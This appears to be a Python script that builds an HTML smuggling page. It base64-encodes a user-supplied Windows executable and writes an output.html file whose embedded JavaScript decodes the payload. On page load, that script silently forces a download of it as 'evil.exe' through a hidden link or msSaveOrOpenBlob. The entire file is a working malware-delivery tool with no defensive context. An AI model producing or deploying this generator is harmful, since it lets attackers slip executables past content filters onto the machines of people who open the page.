import base64
import sys
import time

def exe_to_base64(exe_file_path):
    try:
        with open(exe_file_path, 'rb') as exe_file:
            base64_data = base64.b64encode(exe_file.read()).decode('utf-8')
        return base64_data
    except FileNotFoundError:
        print("Error: File not found.")
        return None
    except Exception as e:
        print(f"Error: {str(e)}")
        return None


def generate_html_with_base64(base64_data):
    html_template = f"""
<!-- HTML Smuggling Code -->
<html>
    <body>
        <script>
            function base64ToArrayBuffer(base64) {{
                var binary_string = window.atob(base64);
                var len = binary_string.length;
                var bytes = new Uint8Array(len);
                for (var i = 0; i < len; i++) {{
                    bytes[i] = binary_string.charCodeAt(i);
                }}
                return bytes.buffer;
            }}

            var base64Data = "{base64_data}";
            var data = base64ToArrayBuffer(base64Data);
            var blob = new Blob([data], {{ type: 'octet/stream' }});
            var fileName = 'evil.exe';

            if (window.navigator.msSaveOrOpenBlob) {{
                window.navigator.msSaveOrOpenBlob(blob, fileName);
            }} else {{
                var a = document.createElement('a');
                document.body.appendChild(a);
                a.style = 'display: none';
                var url = window.URL.createObjectURL(blob);
                a.href = url;
                a.download = fileName;
                a.click();
                window.URL.revokeObjectURL(url);
            }}
        </script>
    </body>
</html>
"""

    return html_template


exe_file_path = input("Enter file (.exe): ")
base64_data = exe_to_base64(exe_file_path)
if base64_data:
    print(f"The Base64 representation of the exe file is success ")

try:
    output_html_content = generate_html_with_base64(base64_data)
    with open('output.html', 'w') as output_file:
      output_file.write(output_html_content)

except:
    print("Crashed")      
    time.sleep(3)
    sys.exit(0)